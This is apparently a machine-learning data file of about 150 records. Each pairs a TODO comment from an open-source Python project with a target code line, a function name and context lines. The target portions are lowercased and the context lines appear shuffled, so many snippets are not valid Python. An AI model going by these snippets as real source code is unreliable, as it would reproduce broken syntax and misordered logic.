# todo should we be using a python library for this? </s> try:	fetch else: url = self.conf['vmcloak-files']['raw'] % info['filename'] print '[x] Fetching %s.' % info['filename'] subprocess.check_call([WGET, '-O', filepath, url])
# todo: check whether the graph execution is resolved correctly. </s> pipeline = pipeline.from_json(description)	test_pipeline_run def test_pipeline_run(description): asyncio.run(pipeline.run())
# todo: currently mnn python binding have mem leak when creating mnn.tensor </s> tmp_input_shape = (batch, height, width, channel)	yolo_predict_mnn image_data = preprocess_image(image, model_input_shape) image_shape = image.size[::-1] input_elementsize = reduce(mul, tmp_input_shape) tmp_input = MNN.Tensor(tmp_input_shape, input_tensor.getDataType(),\
# todo: move part of this to card type. </s> card_type_name_safe = card_type_name.encode('utf8').replace(" ", "_")	accept parent_instance = self.card_types[self.parent_type.currentIndex()] card_type_name = unicode(self.name.text()) id = parent_instance.id + ".ALIAS_" + card_type_name if id in [card_type.id for card_type in card_types()]:
# todo: change this when data is avaialable </s> sum_other = 28.8 + 43.7 + 12 + 0.5	fetch_production continue if iso == 'ERCOT' and fuel_name == 'nonwind': obj['production']['coal'] = obj['production'].get('coal', 0.0) + float(item['gen_MW']) * 28.8 / sum_other obj['production']['gas']  = obj['production'].get('gas', 0.0) + float(item['gen_MW']) * 43.7 / sum_other
pass  # todo </s> def __init__(self, client=none):	Web3Signer class Web3Signer(Signer): def accounts(self) -> List[str]: super().__init__() if not client:
# todo: remove with v1 deprecation </s> if (self.resource_name == 'inventory_source' and	convert 'looking it up.' % param.name, header='details') lookup_data = {resource.identity[-1]: value} not resource._is_full_v1_name(value)): lookup_data = {
# todo -- get a list of these from the api </s> projects = {}	revisions def revisions(self): try: diffs = self.api.differential.query(status='status-open')
# todo actually it is already well tested in base calss actionlog </s> @pytest.mark.parametrize('ev_type', upgradelog.events)	test_upgrade_log_append_api def test_upgrade_log_append_api(log_file_path, ev_type): upgrade_log = UpgradeLog(log_file_path)
# todo: needs input cleansing and validation </s> try:	grant def grant(): Character control endpoint for policy granting. request_data = json.loads(request.data) bob_pubkey = bytes.fromhex(request_data['bob_encrypting_key'])
# todo not supported yet </s> for a, b, c in ("\xe0\xdf\xe7", "\u0430\u0431\u0432"):	test_re_split self.assertTypedEqual(re.split(b"(:+)", string), [b'', b':', b'a', b':', b'b', b'::', b'c']) string = ":%s:%s::%s" % (a, b, c) self.assertEqual(re.split(":", string), ['', a, b, '', c])
#todo: how to use the same data for both transformers </s> @pytest.mark.xfail(strict=true, reason="c2 and ngraph generates own data")	test_sum def test_sum(): net = core.Net("net")
# fix: https://github.com/certtools/intelmq/issues/1720 # todo: find better fix </s> if '/' in value and harmonization.ipnetwork.is_valid(value, sanitize=true):	validate_network def validate_network(value: str) -> Optional[str]: return value return None
uploader.upload_file(file, container='export') # todo: right container folder?! </s> finally:	export_json memzip = make_onefile_memzip(datafile.name, '%s_task.json' % name) file = FileStorage(filename='%d_%s_task_json.zip' % (app.id, name), stream=memzip) datafile.close() json_task_run_generator = respond_json("task_run", app.id)
# todo: implement me </s> loss = criterion(depth, image)	_test_smoke criterion = tgm.losses.DepthSmoothnessLoss()
# todo implement this function </s> return	add_contact :param email: :return:
# todo: try/except this call. </s> self._append_svg(svg)	_handle_display_data if data.has_key('image/svg+xml'): svg = data['image/svg+xml'] elif data.has_key('text/html'): html = data['text/html']
# todo: handle this </s> print "[papyon]", contact, "joined a conversation"	on_conversation_user_joined def on_conversation_user_joined(self, contact):
# todo: this can be formulated more efficiently </s> sqrt_ggn = einsum('boc->cbo', (sqrt_ggn_out, )).contiguous()	weight_diag_ggn num_classes = sqrt_ggn_out.size(2) assert tuple(sqrt_ggn_out.size())[:2] == (batch, out_features) sqrt_ggn = sqrt_ggn.view(num_classes * batch, out_features) sqrt_ggn = sqrt_ggn.view(num_classes * batch, out_channels, out_x * out_y)
if not version_2_79_or_older():  # todo </s> col = box.column(align=true)	draw row.prop(context.scene, 'optimize_mode', expand=True) if context.scene.optimize_mode == 'ATLAS': row = col.row(align=True) row.scale_y = 0.75
# todo find which file is being downloaded with this item. </s> if 'offset' not in event.info['params'] or event.info['params']['offset'] == '0':	downloadItemStartEvent def downloadItemStartEvent(event): rpdb.set_trace() itemModel = Item()
raise notimplementederror # todo </s> def save(self, item):	save
# todo: also improve 'crash-start' detection (to reduce lag when server fails to start) </s> time.sleep(0.1)	main launch_server_daemonized() for _ in range(100): # Check server availability for next 10 seconds s = cnsapp.connect() if s is not None: break
# todo: remove in favor of a proper per-module selection </s> if args.force_module_branch_type is not none:	_load_settings if args.locale: Settings.set('locale', args.locale) Settings.set('_force_module_branch_type', args.force_module_branch_type) if args.list_locales:
# todo: error sound </s> self.on_escape()	mousePressed self.session.set_cursor('building', Entities.buildings[obj.id]) elif obj: # object that is not buildable else: self.on_escape()
# todo: create xxx_failure test </s> p = op.join(app.config['root'], 'tests/fixtures/ttf/font-bold.ttf')	test_result_METADATA_postScriptName_canonical_success def test_result_METADATA_postScriptName_canonical_success(self): r = run_set(p, 'result') success_tests = r['success']
# todo: check ping response </s> self.asserttrue(self.packet_outs_from_flows(echo_replies))	icmp_ping_controller 'ipv4_dst': '10.0.0.254', 'echo_request_data': bytes('A'*8, encoding='UTF-8')})
pass # todo </s> def test_update(self):	test_update
# todo, pass also best score </s> if last_path is not none and not self.trainer.testing:	__recover_child_process_weights if self.trainer.checkpoint_callback: self.trainer.checkpoint_callback.best_model_path = best_path ckpt = torch.load(last_path, map_location=lambda storage, loc: storage) model.load_state_dict(ckpt)
# todo: bash path completion </s> child = child or self.get_default_child()	golf escape=False): Either pass in regexp(s) desired from the output as a string or a list, or an md5sum of the output wanted. if expect_type == 'regexp': if type(expect) == str:
# todo: we should throw here, i don't like this. </s> msg = 'limit "%s" specified, maximum value is "%s"' % (limit, cls.max_limit)	get offset = int(offset) if limit and int(limit) > cls.max_limit: raise ValueError(msg) instances = cls.query(key_hash=value_hash).first()
# todo: missing objects? </s> return dedent(f'''	model_to_code ) fields = '\n            '.join(fields_text) class {model_name}(models.Model): {fields}
#todo, multipart raw submissions need further parsing capacity. </s> instance = request.raw_post_data	extract_instance_from_request attachments[key] = item else: return instance, attachments
# todo: this is untested. </s> _raise_current_error()	load_certificate_request raise ValueError("type argument must be FILETYPE_PEM or FILETYPE_ASN1") if req == _ffi.NULL: x509req = X509Req.__new__(X509Req) x509req._req = _ffi.gc(req, _lib.X509_REQ_free)
# todo allow other audio devices but the default. </s> outputfile = '-d'	__call__ outputfile = dst elif dst is None: else: raise ValueError("Invalid output.")
# todo(sahid): we should never configure a driver backend for </s> conf.driver_name = none	get_config_vhostuser inst_type, virt_type, vif['vnic_type'], host) mode, sock_path = self._get_vhostuser_settings(vif) designer.set_vif_host_backend_vhostuser_config(conf, mode, sock_path)
raise notimplementederror #todo, implement! </s> def testclass(cls):	testclass
# todo: not for checkbox (should have checkbox class) </s> result.add('form-group')	css_classes else: result = set() return ' '.join(result)
# self.assertisnotnone(cursor.service_processing_time_in_millis)  # todo flaky test </s> self.assertisnotnone(cursor.output_location)	test_as_pandas self.assertIsNotNone(cursor.total_execution_time_in_millis) self.assertIsNotNone(cursor.query_planning_time_in_millis) self.assertIsNone(cursor.data_manifest_location)
# todo check if result is in scope -> no evaluation necessary </s> n = dynamic.check_flow_information(self._evaluator, flow_scope,	filter_name break while flow_scope: self.name_str, self.position) if n:
## todo: # fixme: remove me </s> if not paste_childrens:	get_all_pastes_domain paste_parent = father.replace(self.paste_directory, '')[1:] paste_childrens = self.r_serv_metadata.smembers('paste_children:{}'.format(paste_parent)) paste_childrens = self.r_serv_metadata.smembers('paste_children:{}'.format(father)) for children in paste_childrens:
@pytest.mark.skip()  # todo: fix this </s> self.assertisnotnone(response)	test_issue_560_failure response = client.conversations_list(exclude_archived=True)
# todo: this completion may not be good, since it resets to 0 later. </s> history.append([note_hot, beat_input, completion_input, style])	main beat_input = compute_beat(i, NOTES_PER_BAR) completion_input = np.array([i / (len(inspiration) - 1)]) composition = [] N = NOTES_PER_BAR * BARS
# todo: add longer frame data </s> sock = ws.websocket()	testRecv def testRecv(self): s = sock.io_sock = sock.sock = StringSockMock() s.set_data("\x81\x8fabcd\x82\xe3\xf0\x87\xe3\xf1\x80\xe5\xca\x81\xe2\xc5\x82\xe3\xcc")
# todo - retrieve from config </s> timelimit = 2	memberOf def memberOf(self, groupdn, attr_list, opts=None): attr_list (an empty list returns everything).""" searchlimit = 0 groupdn = self.__safe_filter(groupdn)
# todo: refactor things like the augment_punct call </s> sents = augment_punct(sents)	build_combined_english_dataset conllu_file = common.find_treebank_dataset_file(treebank, udbase_dir, "test", "conllu", fail=True) sents.extend(read_sentences_from_conllu(conllu_file)) else: ewt_conllu = common.find_treebank_dataset_file("UD_English-EWT", udbase_dir, dataset, "conllu")
# todo return empty list if not loaded </s> spotify.error.maybe_raise(self.error)	tracks def tracks(self): Will always return :class:`None` if the search isn't loaded. if not self.is_loaded: return None
#todo: fix auditor+south </s> return httpresponseredirect(redirect_to)	login if request.session.test_cookie_worked(): request.session.delete_test_cookie() else: #failed login failed= form.data['username']
# todo, still to work out this </s> itemn.rawdata = data[len(itemn.getdatareferents()):]	unpack for itemn in answer: itemn.fromStringReferents(data) data = itemn.rawData answer2.append(itemn)
# todo: need to kill db connections in order to drop database </s> session.begin_nested()	restart_savepoint if transaction.nested and not transaction._parent.nested:
# todo scope the cleanup to the current project - https://github.com/lyft/cartography/issues/381 </s> cleanup_gcp_firewall_rules(neo4j_session, common_job_parameters)	sync_gcp_firewall_rules fw_list = transform_gcp_firewall(fw_response) load_gcp_ingress_firewalls(neo4j_session, fw_list, gcp_update_tag)
# todo: slow </s> v0 = vector((posa[i0 * 3 + 0], posa[i0 * 3 + 1], posa[i0 * 3 + 2]))	ExportGeometry i1 = ia[i * 3 + 1] i2 = ia[i * 3 + 2] v1 = Vector((posa[i1 * 3 + 0], posa[i1 * 3 + 1], posa[i1 * 3 + 2])) v2 = Vector((posa[i2 * 3 + 0], posa[i2 * 3 + 1], posa[i2 * 3 + 2]))
# todo error reporting over the master event bus </s> self.event.fire_event({'minions': minions}, clear_load['jid'])	publish log.error('The requested returner {0} could not be loaded. Publication not sent.'.format(fstr.split('.')[0])) return {} new_job_load = { 'jid': clear_load['jid'],
# steps = 0 # todo </s> print("dupli export took %.3fs" % (time() - start))	convert transformations = array("f", duplis.matrices) luxcore_scene.DuplicateObject(src_name, dst_name, count, transformations)
# todo(devcamcar): how to assert this succeeded? </s> user = client.users.update_password(user, 'password2')	test_user_create_update_delete user = client.users.update_enabled(user, False) self.assertFalse(user.enabled) user = client.users.update_tenant(user, 'bar') client.users.delete(user.id)
# todo: handle the `scoped` attribute </s> content = [element.text]	find_stylesheets media_attr = element.get('media', '').strip() if element.tag == 'style': for child in element: content.append(child.tail)
# todo stub </s> return defer.succeed(([], to_key))	get_appservice_room_stream if from_key == to_key: return defer.succeed(([], to_key))
#todo:  we make render response return a string if passed a string?? </s> def render_response(controller, response):	render_response the apropriate template engine.   It uses information off of the tg_info object to decide which engine and template to use, and removes anything
#todo: dataset/hda by id (from history) or check_ownership for anon user </s> hda = self.get_history_dataset_association( trans, history, id,	show and ( history_id == trans.security.encode_id( trans.history.id ) ) ): history = trans.history check_ownership=False, check_accessible=True ) else:
# todo: work out a nice fix for this failure. </s> else:	_eval if s.name == "newline": anchor = segment pass elif memory["last_code"] and memory["last_code"].is_type(
1  # todo: fill in identifier </s> )	test_automatic_dispute direct_transfer = channel0.create_directtransfer( amount, direct_transfer.sign(privatekey0, address0) channel0.register_transfer(direct_transfer)
# todo (server): process request, send response </s> self.ui.showmessage("identifying as room controller with password '{}'...".format(controlpassword))	identifyAsController def identifyAsController(self, controlPassword): self._protocol.requestControlledRoom(controlPassword)
# todo: errors </s> return	rest_post_response response = con.read_bytes_finish(results) if response == None: response = response.get_data() con.close()
# todo(amotoki): due to neutron bug 1378525, neutron disables </s> self.ha_allowed = false	__init__ ('distributed', _('Distributed'))] self.fields['mode'].choices = mode_choices if not self.ha_allowed: del self.fields['ha']
# todo: implement purge manually or call it on the command line </s> pass	clean def clean(self):
#todo: a single softmax'd vector?? </s> if not numerator.type.dtype.startswith('float'):	softmax_simplifier def softmax_simplifier(numerators, denominators): for numerator in list(numerators): continue if not numerator.type.broadcastable == (False, False):
# todo this context is probably not right. </s> analysis.add(	_get_item except AttributeError: from jedi.evaluate import analysis contextualized_node.context, 'type-error-not-subscriptable',
# * todo heading 1 --> </s> vim.current.window.cursor = (2, 0)	test_circle_through_todo_states def test_circle_through_todo_states(self): Todo.toggle_todo_state() self.assertEqual(vim.current.buffer[1], '* TODO Heading 1')
# todo find out what is best used here! </s> 'preferred_dtype': np.float32}	get_properties 'is_deterministic': True, 'handles_sparse': False,
## todo: remove shared kwargs </s> return	update_next_token queue.put(None)
# todo: handle winddownset event (see #1193) </s> return receipt	set_winding_down receipt = self.blockchain.send_transaction(contract_function=contract_function, sender_address=self.__beneficiary)
# todo cache? </s> m = re.search(r'_(\d+)_', name)	measurements assert db_dt is not None else: assert m is not None export_ts = int(m.group(1))
# todo: update consumer (agent) </s> pass	distributor_deleted collection.remove(bind, safe=True) for consumer_id,repos in BindCollection(deleted):
raise skiptest("buggy")  # todo(mattjj): fix </s> p = onp.arange(15).reshape((5, 3)) % 4 == 1	testSelect def testSelect(self): f = onp.zeros((5, 3)) def fun(t):
# @todo: pheonix </s> "level {}".format(int(lvl)) if not isinstance(lvl, str) else lvl)	_setTreeSkillLevel 1,
# todo also test these! </s> continue	test_classifiers_classes continue if name in ['MultinomialNB', 'BernoulliNB']: if name in ["LabelPropagation", "LabelSpreading"]: y_ = y
# todo: remove cache clearing once upstream issues regarding non-batch </s> acquisition_function.model.train()	gen_candidates ) batch_acquisition = acquisition_function(candidates) acquisition_function.model.eval() return candidates, batch_acquisition
#todo - mutableseq? </s> try :	extract self.location.nofuzzy_end] if self.strand == -1 : f_seq = f_seq.reverse_complement() except AttributeError :
# todo: handle more complex metric specifications and labeling </s> self._result_fields = config.get('metrics', valueerror("metrics list required"))	GraphiteClient self.start_time = None self.config = config def connect(self): pass
# todo(b/160795287): deprecate estimator based executor. </s> serving_source = executor._serving_model_path(fn_args.model_run_dir)	run_fn eval_input_receiver_fn=training_spec['eval_input_receiver_fn']) absl.logging.info('Exported eval_savedmodel to %s.', fn_args.eval_model_dir) serving_dest = fn_args.serving_model_dir io_utils.copy_dir(serving_source, serving_dest)
# todo: remove this method in v2.5 </s> elif self._values['disabled'] in booleans_true:	disabled if self._values['state'] == 'disabled': return True return True elif self._values['disabled'] in BOOLEANS_FALSE:
# todo add cleanup </s> def get_ips(units):	setUp d.addCallback(lambda _: self.client.add(node_2_name, image)) d.addCallback(lambda _: self.client.list()) docker = Client() prefix = u'flocker--' + namespace + u'--'
# todo: should prob be called before update? </s> for n in range(n):	prob N, T = obs.shape[:2] if self.policy.scale is not None: obs[n, :, self.x_idx] = (obs[n, :, self.x_idx].T.dot(self.policy.scale) + self.policy.bias).T
# todo: remove this log statement when invoking this method on each iteration of the goal state loop (currently it is invoked only on a new goal state) </s> logger.info("fetching vmsettings [correlation id: {0} etag: {1}]", correlation_id, etag)	update_extensions_goal_state etag = self.get_etag() try: def get_vm_settings(): url, headers = self.get_host_plugin().get_vm_settings_request(correlation_id)
# todo per-sync cached results </s> @classmethod	library def library(cls, media, marked, extended='min'): return Trakt.User.get_library(media, marked, extended).get('data')
# todo: avoid dummy and generate func here when inlining is possible </s> def _impl(df, axis=none, skipna=none, level=none, numeric_only=none):	_impl return hpat.hiframes.pd_dataframe_ext.mean_dummy(df)
if not is_old_django: # todo: remove when pre-csrf token templatetags are no longer supported </s> if use_csrf_protection and context.has_key('csrf_token'):	get_render 'toggle_fields': final_toggle_fields } response_dict['csrf_token'] = context['csrf_token'] c = Context(response_dict)
# todo:liberate - move this to a more generalized tag enhancement package? </s> return namespaces	parse_tag_namespaces namespaces[ns].append(tag)
#todo(cp16net): need to set the return code correctly </s> return wsgi.result(views.instancesview(servers).data(), 201)	index def index(self, req, tenant_id): servers = models.Instances(req.headers["X-Auth-Token"]).data()
# todo: modifiers </s> self._vispy_canvas.events.key_release(action='release', key=key, text=text)	on_key_release except Exception: text = ''
#@todo: remove in 0.4.10 </s> def error(self, reason=none, type="parse"):	error raise Fail("%s error%s | Plugin out of date" % (type.capitalize(), ':' + str(reason) if reason else "")) if self.core.debug:
# todo: handle fancy-index copies by allocating a buffer and </s> next_index = self._subset_iterator.next()	next def next(self): return numpy.cast[config.floatX](self._raw_data[next_index])
weigts (float): weights #todo: batched? </s> return np.abs(circuit(*weights)-1)	cost def cost(weights, batched): Args:
#temporarily select a random music file to play. todo: replace with proper playlist </s> self.ingame_music = glob.glob('content/audio/music/*.ogg')	__init__ self.soundmanager = self.engine.engine.getSoundManager() self.soundmanager.init() self.menu_music = glob.glob('content/audio/music/menu/*.ogg') self.initial_menu_music_element = None
# :todo: implement test. </s> self.skiptest('not implemented yet.')	test_fail_bundles_contents_invalid def test_fail_bundles_contents_invalid(self):
# todo: 289 </s> policy.make_arrangements(self.network_middleware, deposit=deposit,	grant deposit = constants.NON_PAYMENT(b"0000000") policy = self.create_policy(bob, uri, m, n) expiration=expiration, quantity=n, federated_only=self.federated_only)
# todo: s_vectors[sent_adr] += eps </s> continue	train_average_np eff_sentences += 1 if not len(word_indices): eff_words += len(word_indices) mem += np_sum(np_mult(w_vectors[word_indices],w_weights[word_indices][:,None]) , axis=0)
# @todo: pheonix </s> tree.setitemtext(childid, 1, "level %d" % int(level) if isinstance(level, float) else level)	populateSkillTreeSkillSearch level, dirty = sChar.getSkillLevel(char.ID, id)
# todo: fix populus support this via an deploy argument </s> if "jsonfile" in c.registrar.registrar_backends:	main if contract_name == "CentrallyIssuedToken": args = [address] + args del c.registrar.registrar_backends["JSONFile"] print("Starting contract deployment")
# todo(asalkeld) support versions </s> for pkg_name, versions in packages.iteritems():	_handle_python_packages def _handle_python_packages(self, packages): very basic support for easy_install cmd_str = 'easy_install %s' % (pkg_name) CommandRunner(cmd_str).run()
# todo generator </s> handle_dirty_dataset(ds, mode=if_dirty)	__call__ for ds_path in content_by_ds: ds = Dataset(ds_path) content = [ap['path'] for ap in content_by_ds[ds_path] if ap.get('type', None) != 'dataset' or ap['path'] == ds.path]
# todo(tetsuro): remove this or condition when all </s> sa.or_(_rp_tbl.c.root_provider_id.in_(root_ids),	_get_usages_by_provider_tree _ALLOC_TBL, _RP_TBL, sa.and_(_ALLOC_TBL.c.resource_provider_id == _RP_TBL.c.id, _RP_TBL.c.id.in_(root_ids)) )
# todo return xml fragment </s> response = httpresponse(content="yes\n%s\n" % username)	validation_success def validation_success(self, username): response.content_type = 'text/plain' return response
# todo alert? </s> raise runtimeerror("add volttron_agent group failed - prevent "	add_agent_user_group response[0])) if response[1]:
# todo: py3 branch fails here </s> assert str_c == expected	bam_stream_bed chr2L	160	165	None	255	+	160	165	0,0,0	1	5,	0,
# todo: raise </s> pass	_parse_list_type else:
# todo: is this test is writing to the default system directory and ignoring updates to the passed filepath? </s> user_input = f'0\n' + f'{insecure_development_password}\n' + f'y\n'	test_ursula_and_local_keystore_signer_integration '--lock-periods', token_economics.minimum_locked_periods, '--force') click_runner.invoke(nucypher_cli, stake_args, input=user_input, catch_exceptions=False) init_args = ('stake', 'set-worker',
# todo: log exception </s> return none	scan output = sshexec(host, list2cmdline(cmdline), port=port, username=user, key_filename=conf["key"]) except Exception as e: output = output.decode("utf-8", errors='replace') virusresults = re.findall("(?:\([^\)]*\) )?([^\s]+) (.+)\s+$", output, re.MULTILINE)
# todo inference in python now missing postprocessing glue code </s> return none	export_tracing ts_model.save(os.path.join(args.output, "model.ts")) dump_torchscript_IR(ts_model, args.output)
# todo: clean up proposed streams here as well? -dan </s> self.proposed_streams = none	cancel_proposal self.handle_notification(notification) else: self.greenlet = None self.state = 'connected'
# todo unordered float </s> return fcom(ir, instr, a, b)	fucom def fucom(ir, instr, a=None, b=None):
raise notimplementederror # todo </s> def _storage_search(self, conditions):	_storage_search
downsized_img = transform.resize(gray_img, (84, 84), mode='constant')  # todo: check resizing doesn't cause problems </s> return torch.from_numpy(downsized_img).unsqueeze(0)  # return 3d image tensor	state_to_tensor def state_to_tensor(state): gray_img = color.rgb2gray(state)  # TODO: Check image conversion doesn't cause problems
# todo: make this more portable with shutil etc. </s> self.run = phlsys_subprocess.run	setUp def setUp(self): self.runCommands = phlsys_subprocess.runCommands self.path = "phlgit_diff_TestDiff"
# todo(andym): delete this once personas are migrated. </s> if not waffle.switch_is_active('personas-migration-completed'):	listed_authors @amo.cached_property(writable=True) def listed_authors(self): class PersonaAuthor(unicode): @property
# todo don't- delete if track is on local nets </s> self.board.removenative(track)	remove_tracks else: if not bounding_box.Intersects(track_bb):
# todo append masters as named-instances as well; needs .designspace change. </s> _add_fvar(gx, axes, instances, axis_map)	build pprint(axes) gx = TTFont(master_ttfs[base_idx]) master_locs = [models.normalizeLocation(m, axes) for m in master_locs] print("Normalized master positions:")
# todo: log discarded bytes? </s> return 'response discarded due to invalid crc.'	decode_out self.out_parsing = False self.out_data = [] comm_address = self.out_data[1] if self.out_data[2] in self.response_map:
# todo(guillermooo): implement a vs a register. </s> return super().__getitem__(key.lower())	__getitem__ if key in ('%', '#'): raise ValueError('unsupported key: %s' % key)
# todo: support aggregation functions sum, count, etc. </s> assert func_name in ['agg', 'aggregate'], "only groubpy agg for now"	_handle_aggregate def _handle_aggregate(self, lhs, rhs, agg_var, func_name): select_def = guard(get_definition, self.func_ir, agg_var) assert (isinstance(select_def, ir.Expr) and select_def.op == 'getitem')
# todo: move to base class </s> rect = self.scenerect()	pan def pan(self, delta): scale = self.currentViewScale() x = -delta.x() / scale
pattern = re.compile(".*-\s"+"(\[[\sx]\]).*") # pattern for a markdown todo-list () </s> todo_list = [line for line in body if pattern.match(line) is not none]	parse_markdown checked = lambda x: "[x]" in x body = [line.encode('utf-8') for line in markdown_body.split("\n")] for i, todo in enumerate(todo_list): delim = "\r"
# todo: order of attributes is not assured; allow for any order. </s> match1 = '<words default-y="45.0" font-weight="bold" justify="left">super fast</words>'	testExportMetronomeMarksD p.repeatAppend(note.Note('g#3'), 8) p.insert(0, tempo.MetronomeMark('super fast', number=222.2)) match2 = '<per-minute>222.2</per-minute>' raw = fromMusic21Object(p)
# todo: fix self.cursor_x >= w </s> line = self.win_y + self.cursor_y	main_cmd_next_bracket def main_cmd_next_bracket(self, h, w): x = self.cursor_x char = self.output.lines[line][x]
# todo pydocs </s> def __init__(self, service, project_id):	BigQueryBaseCursor class BigQueryBaseCursor(object): self.service = service self.project_id = project_id
# todo - verify exit code is 0. using check_output() hangs, not sure why. tried shell=true which doesn't help </s> output = subprocess.getoutput("./backintime --config test/config restore /tmp/test/testfile /tmp/restored 0")	test_local_snapshot_is_successful under certain conditions; type `backintime --license' for details. subprocess.check_output(["./backintime","--config","test/config","snapshots-list"]) self.assertRegex(output, re.compile(''' Back In Time
return deserialize(self.binary, from_bytes=true)  # todo: techdebt fix </s> @object.setter	BinObject @property def object(self) -> Any: def object(self, value: Any) -> None: self.binary = serialize(value, to_bytes=True)  # TODO: techdebt fix
# todo is this necessary? what if an error is raised within the generator? </s> gen.close()	_fasta_to_sequence seq = curr_seq break if seq is None: raise FASTAFormatError(
# todo is there a way to actually test that the creds work? </s> passed("verified pypi credentials")	check_pypi_creds try: token = os.environ['PYPI_TOKEN'] return token except Exception:
# todo: hack </s> network_authentication_id = container_stacks[0].getmetadataentry("network_authentication_id")	read stack = container_stacks[0] if self._resolve_strategies["machine"] == "override": network_authentication_key = container_stacks[0].getMetaDataEntry("network_authentication_key") container_stacks[0].deserialize(archive.open(container_stack_file).read().decode("utf-8"))
# todo: modifiers </s> self._pyvis_canvas.events.key(name='press', key=key, text=text)	keyPressEvent key = self._processKey(event) text = str(event.text())
if dt_def is none:  # todo: check for errors </s> raise valueerror("invalid series.dt")	_run_getattr if rhs_type == series_dt_methods_type: dt_def = guard(get_definition, self.func_ir, rhs.value) rhs.value = dt_def.value return self._run_DatetimeIndex_field(assign, assign.target, rhs)
# todo: how to handle not found authorname </s> result = db.session.query(db.authors).filter(db.authors.sort == auth.lstrip().strip()).first()	order_authors error = False for auth in sort_authors: if not result: error = True
# todo: may test file contents </s> temp = tempfile.namedtemporaryfile(delete=false)	test_export_to_csv_filename def test_export_to_csv_filename(self): self.files_to_delete.append(temp.name) rows.export_to_csv(utils.table, temp.name)
raise notimplementederror # todo </s> self.right_censoring = right_censoring	HSMMStatesPython **kwargs): if left_censoring: self.left_censoring = left_censoring self.trunc = trunc
# todo: catch unacceptable types (str, dict, etc) to avoid errors for other.child below </s> if is_acceptable_simple_type(other) or len(self.child) == len(other.child):  # type: ignore	__add__ self, other: Union[RowEntityPhiTensor, AcceptableSimpleType] ) -> RowEntityPhiTensor: new_list = list() for i in range(len(self.child)):
# todo: temporary hack until they fix </s> handle_tr_writer_deprecation()  # todo: temporary hack	run def run(testdir, path="report.html", *args): path = testdir.tmpdir.join(path) result = testdir.runpytest("--html", path, *args)
# todo: this isn't going to work right.  when we do incremental </s> if question.update is not none:	_extract_question_data d['question_creator'] = question.creator.username d['question_votes'] = question.num_votes_past_week d['age'] = (time.time() - time.mktime(question.updated.timetuple())) / AGE_DIVISOR else:
# todo, this is not working if the action is not active (nla case for example) </s> trans, rot, scale = pose_bone_if_armature.matrix_basis.decompose()	complete_key key.set_value_index(i, non_keyed_values[i]) else: non_keyed_values[i] = { "location": trans,
# todo: use shape inference to figure out how large of an array </s> array_result = self.alloc_array(elt_t, self.shape(max_arg))	transform_TiledMap elt_t = expr.type.elt_type slice_t = array_type.make_slice_type(i.type, i.type, Int64) self.blocks.push() self.assign(i_after, self.add(i, tile_size))
# todo remove above two lines </s> ds.run_procedure('setup_yoda_dataset')	test_basics ds.add('code', to_git=True) ds.add('.') ok_clean_git(ds.path) ds.config.add(
# todo (elliot): put this in the preferences. </s> if prefs.get("stripdevelopersuffixes", false) is true:	recipe_dirpath path_components = [prefs["RecipeCreateLocation"]] if dev is not None and prefs.get("FollowOfficialJSSRecipesFormat", False) is False: dev = strip_dev_suffix(dev) for char in char_replacements:
raise notimplementederror # the below does most probably not work anymore todo </s> base = none	diff TESTS:: TODO if base == "dependencies": branch = self.git.current_branch()
raise exceptions.mpdnotimplemented  # todo </s> clears the playlist ``name.m3u``.	playlistclear ``playlistclear {NAME}``
#remove the already-done entry (this connects to the other todo, </s> schedule = schedule[1:]	main txid = schedule[0][5] restart_waiter(txid + ":0") #add 0 index because all have it elif schedule[0][5] != 0: print("Error: first schedule entry is invalid.")
# todo: other types like boolean </s> typ_val = _h5_typ_table[data_t]	bcast_scalar_overload def bcast_scalar_overload(data_t): assert isinstance(data_t, (types.Integer, types.Float)) func_text = ( "def bcast_scalar_impl(val):\n"
# todo: add broadcasting to get_rotation_matrix2d for center </s> center = center.expand(angle.shape[0], -1)	rotate if center is None: center: torch.Tensor = compute_rotation_center(tensor) rotation_matrix: torch.Tensor = compute_rotation_matrix(angle, center) return affine(tensor, rotation_matrix[..., :2, :3])
return ""  # todo: followup after decision around returning none </s> unix_time = unix_time - 11644473600	get_create_time unix_time = self.CreateTime.QuadPart // 10000000 if unix_time == 0: return str(datetime.datetime.utcfromtimestamp(unix_time))
# todo move this to augmenters.size </s> def compute_paddings_to_reach_multiples_of(arr, height_multiple,	compute_paddings_to_reach_multiples_of width_multiple): See :func:`imgaug.imgaug.compute_paddings_for_aspect_ratio` for an
# todo(denero) fix user plumbing using @requires_authenticated_user </s> return assignments[0]	get_assignment raise BadValueError('Multiple assignments named "%s"' % name)
# todo update docstring </s> rpm_directory.createdirectory()	update_repo :param list packages: List of bytes, each specifying the name of a package to upload to the repository. yield Effect(DownloadS3KeyRecursively( source_bucket=target_bucket,
# todo(elliot): what info do we need for this recipe type? </s> pass	handle_app_input pass if recipes[i]["name"] == "sccm": if recipes[i]["name"] == "ds": pass
# todo: the following skipped suite and fixtures should be enabled </s> return ['api-key']	_filter_headers def _filter_headers(self):
# todo: handle this case </s> def xxx_test_ignoring_back_slash_in_comments(self):	xxx_test_ignoring_back_slash_in_comments self.editor.set_text('# hello \\\na = 10') self.indenter.correct_indentation(2)
# todo: create xxx_failure test </s> p = op.join(app.config['root'], 'tests/fixtures/ttf/font-bold.ttf')	test_result_METADATA_postScriptName_canonical_success def test_result_METADATA_postScriptName_canonical_success(self): r = run_set(p, 'result') success_tests = r['success']
#todo: this can probably just be removed now? </s> return self.none	getattr_gi def getattr_gi(self, inst, key): try: if inst.get_data(key) is None:
# todo: what if there weren't enough contracts approved to distribute n kfrags?  we need to raise notenoughqualifiedursulas. </s> policy.enact(networky_stuff)  # rest call happens here, as does population of treasuremap.	grant kfrag = policy.assign_kfrag_to_contract(contract) contract.activate(kfrag, ursula, result) return policy
# todo remove comment parameter. </s> if isinstance(constraint, bool):	add def add(self, constraint, comment=None): if not constraint: self._status = 'unsat'
# todo: add highlighting line </s> return	mouseDoubleClickEvent new_line = self._lines.index(new_line[0]) self.verticalScrollBar().setValue(new_line) except IndexError: pass
# todo(lyarwood): test drivervolumeblockdevice.driver_detach in </s> expected_connector = {'host': 'evacuated-host'}	test_detach_volume_evacuate def test_detach_volume_evacuate(self): conn_info_str = '{"connector": {"host": "evacuated-host"}}' self._test_detach_volume_evacuate(conn_info_str,
tokenize_with_offsets=not use_sp_model,  # todo(b/181866850): drop this. </s> experimental_disable_assert=true,  # todo(b/175369555): drop this.	test_shapes preprocess = tf.saved_model.load(self._do_export( ["abc", "def"], do_lower_case=True, use_sp_model=use_sp_model)) def expected_bert_input_shapes(batch_size, seq_length):
